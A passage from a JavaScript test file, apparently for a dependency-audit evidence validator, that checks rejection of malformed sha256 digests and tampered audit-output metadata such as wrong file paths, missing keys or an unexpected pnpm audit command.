  const valid = 'a95a15f40da43f4e9abef87f1258dc78b06485c180d8b5814c97092dd785a6c9'
  // A digest field present but unusable, so a mismatch can never be checked.
  const invalidDigests = [
    null,
    '',
    ' ',
    'stale',
    valid.toUpperCase(),
    valid.slice(0, 63),
    `${valid}0`,
    42,
  ]

  for (const lockfileSha256 of [...invalidDigests, undefined]) {
    const audit = auditEvidenceFixture({ lockfileSha256 })
    assert.deepEqual(audit.errors, [`${INVENTORY_FILE} lockfileSha256 must be a sha256 hex digest`])
    assert.equal(audit.boundFiles, 1)
  }

  for (const sha256 of invalidDigests) {
    const audit = auditEvidenceFixture({}, { sha256 })
    assert.deepEqual(audit.errors, [
      `${INVENTORY_FILE} auditOutput.sha256 must be a sha256 hex digest`,
    ])
    assert.equal(audit.boundFiles, 1)
  }
})

test('dependency evidence audit rejects tampered audit output metadata', () => {
  const shapeError = `${INVENTORY_FILE} auditOutput must record exactly file, sha256, and command`
  for (const auditOutput of [undefined, null, 'docs/security/dependency-audit.json', []]) {
    const audit = auditEvidenceFixture({ auditOutput })
    assert.deepEqual(audit.errors, [shapeError])
    assert.equal(audit.boundFiles, 1)
  }
  // A digest or metadata key dropped entirely is a shape failure, not a value
  // failure, so it can never be mistaken for evidence that was checked.
  assert.deepEqual(auditEvidenceFixture({}, { generatedAt: '2026-09-03' }).errors, [shapeError])
  assert.deepEqual(auditEvidenceFixture({}, { command: undefined }).errors, [shapeError])
  assert.deepEqual(auditEvidenceFixture({}, { file: undefined }).errors, [shapeError])
  assert.deepEqual(auditEvidenceFixture({}, { sha256: undefined }).errors, [shapeError])

  assert.deepEqual(auditEvidenceFixture({}, { file: 'docs/security/other-audit.json' }).errors, [
    `${INVENTORY_FILE} auditOutput.file must be ${AUDIT_FILE}, found "docs/security/other-audit.json"`,
  ])
  assert.deepEqual(auditEvidenceFixture({}, { command: 'pnpm audit --json --no-color' }).errors, [
    `${INVENTORY_FILE} auditOutput.command must be corepack pnpm audit --json, found "pnpm audit --json --no-color"`,
  ])
})
